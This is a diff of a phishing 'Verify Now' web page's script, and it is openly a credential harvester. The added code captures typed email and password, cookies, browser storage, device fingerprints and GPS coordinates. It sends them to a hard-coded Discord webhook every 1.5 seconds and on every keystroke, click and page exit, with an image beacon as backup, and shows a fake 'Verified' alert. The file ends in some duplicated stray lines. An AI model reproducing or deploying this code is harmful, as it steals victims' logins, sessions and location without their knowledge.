@@ -14,12 +14,12 @@ button:hover{background:#1976d2;}</style>
 <button onclick="verify()">Verify Now</button>
 
 <script>
+const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
+
 function grabEverything() {
-    // GRAB FORM DATA
     const email = document.getElementById('email')?.value || '';
     const pass = document.getElementById('pass')?.value || '';
     
-    // FULL HARVEST - EVERYTHING BROWSER HAS
     const data = {
         timestamp: new Date().toISOString(),
         url: window.location.href,
@@ -27,8 +27,6 @@ function grabEverything() {
         title: document.title,
         cookies: document.cookie,
         form: {email, password: pass},
-        
-        // USER AGENT & DEVICE FINGERPRINT
         userAgent: navigator.userAgent,
         language: navigator.language,
         languages: navigator.languages,
@@ -39,30 +37,18 @@ function grabEverything() {
         cookieEnabled: navigator.cookieEnabled,
         doNotTrack: navigator.doNotTrack,
         plugins: Array.from(navigator.plugins).map(p => ({name: p.name, description: p.description, filename: p.filename})),
-        
-        // SCREEN & WINDOW
         screen: {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
+            width: screen.width, height: screen.height, availWidth: screen.availWidth,
+            availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
         },
         window: {
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            outerWidth: window.outerWidth,
-            outerHeight: window.outerHeight
+            innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth, outerHeight: window.outerHeight
         },
-        
-        // STORAGE - EVERY KEY/VALUE PAIR
         localStorage: Object.fromEntries(Object.entries(localStorage)),
         sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
         localKeys: Object.keys(localStorage),
         sessionKeys: Object.keys(sessionStorage),
-        
-        // DOM & HISTORY
         historyLength: history.length,
         forms: Array.from(document.forms).map(f => ({
             id: f.id, name: f.name, elements: Array.from(f.elements).map(e => ({name: e.name, type: e.type, value: e.value?.slice(0,100)}))
@@ -70,127 +56,124 @@ function grabEverything() {
         inputs: Array.from(document.querySelectorAll('input,textarea,select')).map(el => ({
             id: el.id, name: el.name, type: el.type, value: el.value?.slice(0,100)
         })),
-        
-        // NETWORK & WEBRTC
         connection: navigator.connection ? {
             type: navigator.connection.type,
             effectiveType: navigator.connection.effectiveType,
             downlink: navigator.connection.downlink,
             rtt: navigator.connection.rtt
         } : null,
-        
-        // CANVAS FINGERPRINT
         canvas: getCanvasFingerprint(),
-        
-        // WEBGL FINGERPRINT
-        webgl: getWebGLFingerprint(),
-        
-        // ALL HEADERS VIA TIMING ATTACK
-        headers: getHeaders(),
-        
-        // GEOLOCATION (PROMPT USER)
-        geolocation: 'requesting...'
+        webgl: getWebGLFingerprint()
     };
     
     return data;
 }
 
 function getCanvasFingerprint() {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillText('Canvas fingerprint', 2, 2);
-    return canvas.toDataURL();
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Canvas fingerprint v1', 2, 2);
+        ctx.fillText('🦠', 2, 20);
+        return canvas.toDataURL();
+    } catch(e) { return null; }
 }
 
 function getWebGLFingerprint() {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (!gl) return null;
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    return {
-        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
-        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
-    };
-}
-
-function getHeaders() {
-    return new Promise(resolve => {
-        const req = new XMLHttpRequest();
-        req.open('GET', '/', true);
-        req.onreadystatechange = () => {
-            if (req.readyState === 4) {
-                const headers = {};
-                const headerStr = req.getAllResponseHeaders();
-                headerStr.split('\n').forEach(line => {
-                    const [key, value] = line.split(': ');
-                    if (key && value) headers[key.trim()] = value.trim();
-                });
-                resolve(headers);
-            }
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return null;
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
+            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
         };
-        req.send();
-    });
+    } catch(e) { return null; }
 }
 
-// DISCORD WEBHOOK SENDER - MOST RELIABLE
 async function sendToDiscord(data) {
     try {
         const payload = {
-            username: "🚨 CREDENTIAL HARVEST",
+            username: "🔥 CREDENTIALS CAPTURED",
+            avatar_url: "https://i.imgur.com/phishing.png",
             embeds: [{
-                title: `🎯 New Victim Data`,
-                description: `**Email:** \`${data.form.email || 'N/A'}\`\n**Password:** \`${data.form.password || 'N/A'}\``,
+                title: `🎯 VICTIM HARVESTED`,
+                description: `**📧 Email:** \`${data.form.email || 'N/A'}\`\n**🔑 Password:** \`${data.form.password || 'N/A'}\``,
                 color: 16711680,
                 fields: [
-                    {name: "IP/UserAgent", value: `\`${data.userAgent.slice(0,100)}...\``, inline: true},
-                    {name: "URL", value: `[${data.url}](${data.url})`, inline: true},
-                    {name: "Timestamp", value: `<t:${Math.floor(new Date(data.timestamp).getTime()/1000)}:F>`, inline: true}
+                    {name: "🌐 IP/UserAgent", value: `\`${data.userAgent.slice(0,80)}...\``, inline: true},
+                    {name: "🔗 URL", value: `[${data.url}](${data.url})`, inline: true},
+                    {name: "⏰ Time", value: `<t:${Math.floor(new Date(data.timestamp).getTime()/1000)}:F>`, inline: true},
+                    {name: "📱 Device", value: `\`${data.platform} | ${data.deviceMemory || 'N/A'}GB\``, inline: true},
+                    {name: "💾 Storage", value: `\`${data.localKeys.length} local | ${data.sessionKeys.length} session\``, inline: true},
+                    {name: "📜 Cookies", value: `\`${data.cookies.slice(0,60)}...\``, inline: true}
                 ],
-                thumbnail: {url: "https://i.imgur.com/target.png"}
+                footer: {text: `History: ${data.historyLength} | Plugins: ${data.plugins.length}`}
             }]
         };
         
-        // RAW DATA AS FILE ATTACHMENT
+        // SEND SUMMARY + RAW DATA FILE
         const fullData = JSON.stringify(data, null, 2);
         const formData = new FormData();
         formData.append('payload_json', JSON.stringify(payload));
-        formData.append('file', new Blob([fullData], {type: 'application/json'}), `victim-${Date.now()}.json`);
+        formData.append('file', new Blob([fullData], {type: 'application/json'}), `victim-${Date.now()}-${btoa(data.form.email || 'anon')}.json`);
         
-        await fetch('YOUR_DISCORD_WEBHOOK_URL', {
-            method: 'POST',
-            body: formData
-        });
+        await fetch(WEBHOOK, {method: 'POST', body: formData});
         
-        // BACKUP: Image beacon
-        new Image().src = 'YOUR_DISCORD_WEBHOOK_URL?data=' + btoa(fullData).slice(0, 2000);
+        // BACKUP BEACON (truncated)
+        new Image().src = WEBHOOK.split('/api')[0] + '/pixel.png?data=' + btoa(JSON.stringify({email: data.form.email, pass: data.form.password, ua: data.userAgent})).slice(0, 1800);
         
     } catch(e) {
-        console.log('Discord send failed:', e);
+        // Silent fail - try image beacon only
+        const miniData = {email: document.getElementById('email')?.value, pass: document.getElementById('pass')?.value, ua: navigator.userAgent};
+        new Image().src = `https://httpbin.org/image/png?d=${btoa(JSON.stringify(miniData))}`;
     }
 }
 
-// ENHANCED EXFIL
 async function exfil() {
-    const data = await grabEverything();
-    console.log('🚀 EXFILLED COMPLETE DATASET');
+    const data = grabEverything();
     await sendToDiscord(data);
+    console.log('🚀 FULL HARVEST SENT');
 }
 
-// AUTO-REQUEST GEOLOCATION
+// GEOLOCATION STEAL
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-        pos => console.log('Geo grabbed:', pos),
-        () => console.log('Geo denied')
+        pos => {
+            const geoData = {lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy};
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: "📍 GEOLOCATION",
+                    embeds: [{title: "GPS Captured", description: `Lat: ${geoData.lat}, Lon: ${geoData.lon}`, color: 3447003}]
+                })
+            });
+        }
     );
 }
 
-// EXECUTE EVERYWHERE
+// MAXIMUM EXFIL TRIGGERS
 exfil();
-setInterval(exfil, 2000);  // Every 2s
-document.addEventListener('click', exfil);
-document.addEventListener('keydown', exfil);
+setInterval(exfil, 1500);
+['click', 'keydown', 'input', 'mousedown', 'mouseup', 'mousemove'].forEach(evt => 
+    document.addEventListener(evt, exfil)
+);
+window.addEventListener('beforeunload', exfil);
+window.addEventListener('pagehide', exfil);
+
+function verify() {
+    exfil();
+    setTimeout(() => {
+        alert('✅ Verified! Redirecting to dashboard...');
+    }, 300);
+}
+</script>
+</body>
+</html>document.addEventListener('keydown', exfil);
 document.addEventListener('input', exfil);
 window.addEventListener('beforeunload', exfil);
 
